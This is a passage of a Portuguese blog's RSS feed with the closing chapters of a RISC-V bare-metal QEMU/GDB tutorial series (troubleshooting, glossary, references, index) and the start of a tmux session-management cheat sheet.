+&lt;h2 id="capstone-1-rv32-binaryisc---um-mini-monitor-de-firmware-no-qemu">Capstone 1: RV32 “binaryISC” - um mini monitor de firmware no QEMU&lt;/h2>
+&lt;h3 id="objetivo">Objetivo&lt;/h3>
+&lt;p>Construir um programa bare-metal RV32 mínimo que:&lt;/p></description></item><item><title>Resumo da série</title><link>https://psylinux.github.io/pt/series/experimenting-with-risc-v/18-summary/</link><pubDate>Tue, 20 Jan 2026 06:31:23 +0000</pubDate><guid>https://psylinux.github.io/pt/series/experimenting-with-risc-v/18-summary/</guid><description>&lt;h2 id="pontos-chave">Pontos-chave&lt;/h2>
+&lt;ul>
+&lt;li>&lt;strong>Toolchain&lt;/strong>: use sempre &lt;code>riscv64-unknown-elf-gcc&lt;/code> para builds bare-metal RV32.&lt;/li>
+&lt;li>&lt;strong>Runtime&lt;/strong>: &lt;code>_start&lt;/code> configura a pilha e zera &lt;code>.bss&lt;/code>; nenhuma libc é assumida.&lt;/li>
+&lt;li>&lt;strong>QEMU&lt;/strong>: rode tudo no &lt;code>qemu-system-riscv32&lt;/code> com &lt;code>-bios none&lt;/code> e &lt;code>-kernel&lt;/code>.&lt;/li>
+&lt;li>&lt;strong>Depuração&lt;/strong>: GDB + QEMU fornece breakpoints, watchpoints e step de instruções.&lt;/li>
+&lt;li>&lt;strong>MMIO&lt;/strong>: saída UART em &lt;code>0x10000000&lt;/code> é o caminho de saída mais simples e confiável.&lt;/li>
+&lt;/ul>
+&lt;h2 id="exercícios">Exercícios&lt;/h2>
+&lt;ol>
+&lt;li>Escolha um programa e adicione uma nova função, então verifique o call frame no GDB.&lt;/li>
+&lt;li>Modifique &lt;code>src/uart.c&lt;/code> para adicionar um helper &lt;code>uart_puthex8&lt;/code> e use-o em um exemplo do capítulo.&lt;/li>
+&lt;li>Substitua um exemplo em C por uma versão pura em assembly.&lt;/li>
+&lt;/ol>
+&lt;h2 id="resumo">Resumo&lt;/h2>
+&lt;p>Você agora tem um workflow completo de RV32 bare-metal que roda inteiramente no QEMU. Você consegue compilar, rodar, traçar e depurar sem nenhum hardware físico.&lt;/p></description></item><item><title>Solução de problemas</title><link>https://psylinux.github.io/pt/series/experimenting-with-risc-v/19-troubleshooting/</link><pubDate>Tue, 20 Jan 2026 06:31:23 +0000</pubDate><guid>https://psylinux.github.io/pt/series/experimenting-with-risc-v/19-troubleshooting/</guid><description>&lt;h2 id="qemu-não-mostra-saída">QEMU não mostra saída&lt;/h2>
+&lt;ul>
+&lt;li>Confirme que você usou &lt;code>-nographic&lt;/code> e &lt;code>-bios none&lt;/code>.&lt;/li>
+&lt;li>Garanta que o programa escreve na UART em &lt;code>0x10000000&lt;/code>.&lt;/li>
+&lt;li>Verifique se o ELF é RV32 (&lt;code>readelf -h&lt;/code> mostra &lt;code>ELF32&lt;/code> + &lt;code>RISC-V&lt;/code>).&lt;/li>
+&lt;/ul>
+&lt;h2 id="gdb-conecta-mas-os-breakpoints-não-param">GDB conecta, mas os breakpoints não param&lt;/h2>
+&lt;ul>
+&lt;li>Inicie o QEMU com &lt;code>-S&lt;/code> para a CPU ficar pausada.&lt;/li>
+&lt;li>Certifique-se de que seu ELF tem símbolos (&lt;code>-g&lt;/code>).&lt;/li>
+&lt;li>Defina &lt;code>set arch riscv:rv32&lt;/code> no GDB.&lt;/li>
+&lt;/ul>
+&lt;h2 id="erros-de-linker-missing-_start">Erros de linker: missing _start&lt;/h2>
+&lt;ul>
+&lt;li>Confirme que &lt;code>src/start.s&lt;/code> está incluído na linha de comando.&lt;/li>
+&lt;li>Verifique se &lt;code>src/link.ld&lt;/code> usa &lt;code>ENTRY(_start)&lt;/code>.&lt;/li>
+&lt;/ul>
+&lt;h2 id="qemu-sai-imediatamente">QEMU sai imediatamente&lt;/h2>
+&lt;ul>
+&lt;li>Se &lt;code>main&lt;/code> retorna, &lt;code>_start&lt;/code> deve entrar em loop ou executar &lt;code>wfi&lt;/code>.&lt;/li>
+&lt;li>Verifique que sua função &lt;code>_start&lt;/code> existe e não foi otimizada para fora.&lt;/li>
+&lt;/ul>
+&lt;h2 id="exercícios">Exercícios&lt;/h2>
+&lt;ol>
+&lt;li>Remova &lt;code>-T src/link.ld&lt;/code> de propósito e observe o erro.&lt;/li>
+&lt;li>Remova &lt;code>src/start.s&lt;/code> e identifique o símbolo faltante.&lt;/li>
+&lt;li>Troque &lt;code>-march&lt;/code> para &lt;code>rv32i&lt;/code> e veja se algum exemplo quebra.&lt;/li>
+&lt;/ol>
+&lt;h2 id="resumo">Resumo&lt;/h2>
+&lt;p>A maioria dos problemas vem de arquivo de startup faltando, ELF errado ou flags do QEMU esquecidas. As correções são determinísticas e fáceis de confirmar com &lt;code>readelf&lt;/code> e GDB.&lt;/p></description></item><item><title>Glossário</title><link>https://psylinux.github.io/pt/series/experimenting-with-risc-v/20-glossary/</link><pubDate>Tue, 20 Jan 2026 06:31:23 +0000</pubDate><guid>https://psylinux.github.io/pt/series/experimenting-with-risc-v/20-glossary/</guid><description>&lt;p>&lt;strong>ABI&lt;/strong>: Application Binary Interface; regras de convenção de chamada, uso de registradores e layout de dados.&lt;/p>
+&lt;p>&lt;strong>Bare-metal&lt;/strong>: Código rodando direto no hardware (ou emulador) sem sistema operacional.&lt;/p>
+&lt;p>&lt;strong>BSS&lt;/strong>: Block Started by Symbol; segmento de dados não inicializados, zerado na inicialização.&lt;/p>
+&lt;p>&lt;strong>CSR&lt;/strong>: Control and Status Register; registradores especiais de controle e estado do RISC-V.&lt;/p>
+&lt;p>&lt;strong>ELF&lt;/strong>: Executable and Linkable Format; formato padrão de arquivo para binários compilados.&lt;/p>
+&lt;p>&lt;strong>Entry point (_start)&lt;/strong>: Primeiro ponto de execução; símbolo do linker onde a execução começa.&lt;/p></description></item><item><title>Apêndice: Recursos</title><link>https://psylinux.github.io/pt/series/experimenting-with-risc-v/21-appendix/</link><pubDate>Tue, 20 Jan 2026 06:31:23 +0000</pubDate><guid>https://psylinux.github.io/pt/series/experimenting-with-risc-v/21-appendix/</guid><description>&lt;h2 id="referências-e-leitura-adicional">Referências e leitura adicional&lt;/h2>
+&lt;ul>
+&lt;li>RISC-V ISA Manual (Volume I: Unprivileged): &lt;a href="https://github.com/riscv/riscv-isa-manual/releases">https://github.com/riscv/riscv-isa-manual/releases&lt;/a>&lt;/li>
+&lt;li>RISC-V ELF psABI: &lt;a href="https://github.com/riscv-non-isa/riscv-elf-psabi-doc">https://github.com/riscv-non-isa/riscv-elf-psabi-doc&lt;/a>&lt;/li>
+&lt;li>QEMU RISC-V system emulation: &lt;a href="https://www.qemu.org/docs/master/system/target-riscv.html">https://www.qemu.org/docs/master/system/target-riscv.html&lt;/a>&lt;/li>
+&lt;li>GCC RISC-V options: &lt;a href="https://gcc.gnu.org/onlinedocs/gcc/RISC-V-Options.html">https://gcc.gnu.org/onlinedocs/gcc/RISC-V-Options.html&lt;/a>&lt;/li>
+&lt;li>GDB manual: &lt;a href="https://sourceware.org/gdb/current/onlinedocs/gdb/">https://sourceware.org/gdb/current/onlinedocs/gdb/&lt;/a>&lt;/li>
+&lt;/ul>
+&lt;h2 id="recursos-adicionais">Recursos adicionais&lt;/h2>
+&lt;ul>
+&lt;li>RISC-V Assembly Programmer&amp;rsquo;s Manual: &lt;a href="https://github.com/riscv-non-isa/riscv-asm-manual">https://github.com/riscv-non-isa/riscv-asm-manual&lt;/a>&lt;/li>
+&lt;li>GNU binutils manuals (&lt;code>objdump&lt;/code>, &lt;code>readelf&lt;/code>, &lt;code>objcopy&lt;/code>): &lt;a href="https://sourceware.org/binutils/docs/">https://sourceware.org/binutils/docs/&lt;/a>&lt;/li>
+&lt;li>Documentação da máquina QEMU &lt;code>virt&lt;/code>: &lt;a href="https://www.qemu.org/docs/master/system/riscv/virt.html">https://www.qemu.org/docs/master/system/riscv/virt.html&lt;/a>&lt;/li>
+&lt;/ul>
+&lt;h2 id="exercícios">Exercícios&lt;/h2>
+&lt;ol>
+&lt;li>Abra o manual RISC-V ISA e encontre a codificação de &lt;code>add&lt;/code>.&lt;/li>
+&lt;li>Localize o mapa de memória do QEMU &lt;code>virt&lt;/code> e liste o endereço base da UART.&lt;/li>
+&lt;/ol>
+&lt;h2 id="resumo">Resumo&lt;/h2>
+&lt;p>Estas referências são as fontes autoritativas para comportamento de instruções, regras de ABI e opções do emulador. Use-as quando precisar de especificações exatas ou detalhes de edge case.&lt;/p></description></item><item><title>Índice</title><link>https://psylinux.github.io/pt/series/experimenting-with-risc-v/22-index/</link><pubDate>Tue, 20 Jan 2026 06:31:23 +0000</pubDate><guid>https://psylinux.github.io/pt/series/experimenting-with-risc-v/22-index/</guid><description>&lt;ul>
+&lt;li>&lt;strong>ABI&lt;/strong>: ABI RV32 + tipos em C&lt;/li>
+&lt;li>&lt;strong>Assembly básico&lt;/strong>: Instruções básicas de assembly RISC-V&lt;/li>
+&lt;li>&lt;strong>Depuração&lt;/strong>: Debug de RV32 com QEMU + GDB&lt;/li>
+&lt;li>&lt;strong>ELF&lt;/strong>: Internals de ELF e Binutils&lt;/li>
+&lt;li>&lt;strong>Linker script&lt;/strong>: Scripts de linker e mapas de memória&lt;/li>
+&lt;li>&lt;strong>MMIO/UART&lt;/strong>: Interfaces no QEMU: UART e conceitos de MMIO&lt;/li>
+&lt;li>&lt;strong>Otimização&lt;/strong>: C → ASM: otimizações e volatile&lt;/li>
+&lt;li>&lt;strong>Rodar QEMU&lt;/strong>: Configurando a toolchain e o QEMU&lt;/li>
+&lt;li>&lt;strong>Tracing&lt;/strong>: Análise dinâmica com tracing no QEMU&lt;/li>
+&lt;/ul>
+&lt;h2 id="exercícios">Exercícios&lt;/h2>
+&lt;ol>
+&lt;li>Use o índice para ir ao capítulo de depuração e localizar a primeira lista de comandos GDB.&lt;/li>
+&lt;li>Encontre o capítulo que explica scripts de linker.&lt;/li>
+&lt;/ol>
+&lt;h2 id="resumo">Resumo&lt;/h2>
+&lt;p>Use este índice como um mapa rápido para ir ao capítulo que corresponde à sua dúvida imediata.&lt;/p></description></item><item><title>Contato</title><link>https://psylinux.github.io/pt/series/experimenting-with-risc-v/23-contact/</link><pubDate>Tue, 20 Jan 2026 06:31:23 +0000</pubDate><guid>https://psylinux.github.io/pt/series/experimenting-with-risc-v/23-contact/</guid><description>&lt;p>Dúvidas ou feedback?&lt;/p>
+&lt;ul>
+&lt;li>Abra uma issue no repositório.&lt;/li>
+&lt;li>Inclua o nome do capítulo e a seção para facilitar a reprodução.&lt;/li>
+&lt;li>Se você propuser correções, inclua os comandos exatos que rodou.&lt;/li>
+&lt;/ul>
+&lt;h2 id="exercícios">Exercícios&lt;/h2>
+&lt;ol>
+&lt;li>Rascunhe um template curto de issue que você poderia reutilizar em bugs futuros.&lt;/li>
+&lt;/ol>
+&lt;h2 id="resumo">Resumo&lt;/h2>
+&lt;p>Feedback ajuda a melhorar a série e manter os exemplos corretos.&lt;/p></description></item><item><title>Cheat Sheet :: Tmux</title><link>https://psylinux.github.io/pt/cheatsheet/cheatsheet_tmux/</link><pubDate>Thu, 25 Mar 2021 17:19:34 -0300</pubDate><guid>https://psylinux.github.io/pt/cheatsheet/cheatsheet_tmux/</guid><description>&lt;h2 id="trabalhando-com-sessões">Trabalhando com sessões&lt;/h2>
+&lt;h3 id="nova-sessão">Nova sessão&lt;/h3>
+&lt;ul>
+&lt;li>Iniciar uma nova sessão&lt;/li>
+&lt;/ul>
+&lt;div class="highlight">&lt;div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>tmux new-session
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;ul>
+&lt;li>Ou você pode digitar&lt;/li>
+&lt;/ul>
+&lt;div class="highlight">&lt;div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>tmux
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;ul>
+&lt;li>Ou usar o &lt;strong>atalho&lt;/strong>&lt;/li>
+&lt;/ul>
+&lt;div class="highlight">&lt;div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>tmux new
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;ul>
+&lt;li>Se você &lt;strong>já estiver dentro&lt;/strong> do &lt;code>tmux&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;div class="highlight">&lt;div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>Ctrl + b + n
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;ul>
+&lt;li>Iniciar uma nova sessão com o nome &lt;strong>mysession&lt;/strong>&lt;/li>
+&lt;/ul>
+&lt;div class="highlight">&lt;div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>tmux new -s mysession : new -s mysession
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h3 id="encerrarexcluir-sessões">Encerrar/Excluir sessões&lt;/h3>
+&lt;ul>
+&lt;li>Encerrar/Excluir &lt;strong>mysession&lt;/strong>&lt;/li>
+&lt;/ul>
+&lt;div class="highlight">&lt;div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>tmux kill-session -t mysession
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;ul>
+&lt;li>Ou usar o &lt;strong>atalho&lt;/strong>&lt;/li>
+&lt;/ul>
+&lt;div class="highlight">&lt;div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>tmux kill-ses -t mysession
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;ul>
+&lt;li>Encerrar/Excluir todas as sessões &lt;em>exceto&lt;/em> &lt;strong>mysession&lt;/strong>&lt;/li>
+&lt;/ul>
+&lt;div class="highlight">&lt;div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>tmux kill-session -a -t mysession
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;ul>
+&lt;li>Encerrar/Excluir todas as sessões &lt;em>exceto&lt;/em> a sessão &lt;strong>atual&lt;/strong>&lt;/li>
+&lt;/ul>
+&lt;div class="highlight">&lt;div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>tmux kill-session -a
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h3 id="renomear-sessão">Renomear sessão&lt;/h3>
+&lt;ul>
+&lt;li>Se você &lt;strong>já estiver dentro&lt;/strong> do &lt;code>tmux&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;div class="highlight">&lt;div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>Ctrl + b + $
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h3 id="mover-entre-sessões">Mover entre sessões&lt;/h3>
+&lt;ul>
+&lt;li>Ir para a sessão anterior // Se você &lt;strong>já estiver dentro&lt;/strong> do &lt;code>tmux&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;div class="highlight">&lt;div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>Ctrl + b + &lt;span style="color:#f92672">(&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;ul>
+&lt;li>Ir para a próxima sessão // Se você &lt;strong>já estiver dentro&lt;/strong> do &lt;code>tmux&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;div class="highlight">&lt;div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>Ctrl + b + &lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h3 id="anexar-a-uma-sessão-existente">Anexar a uma sessão existente&lt;/h3>
+&lt;h4 id="anexar-à-última-sessão">Anexar à última sessão&lt;/h4>
+&lt;div class="highlight">&lt;div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>tmux attach-session
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;ul>
+&lt;li>Ou&lt;/li>
+&lt;/ul>
+&lt;div class="highlight">&lt;div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>tmux attach
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;ul>
+&lt;li>Ou&lt;/li>
+&lt;/ul>
+&lt;div class="highlight">&lt;div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>tmux at
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;ul>
+&lt;li>Ou usar o &lt;strong>atalho&lt;/strong>&lt;/li>
+&lt;/ul>
+&lt;div class="highlight">&lt;div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
